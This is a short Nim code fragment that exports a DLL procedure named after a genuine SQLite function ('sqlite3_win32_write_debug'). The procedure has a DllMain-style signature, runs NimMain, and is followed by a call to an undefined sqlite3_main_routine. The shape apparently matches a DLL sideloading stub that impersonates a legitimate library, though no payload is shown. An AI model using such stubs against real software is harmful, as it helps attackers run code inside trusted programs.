proc `sqlite3_win32_write_debug`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

sqlite3_main_routine()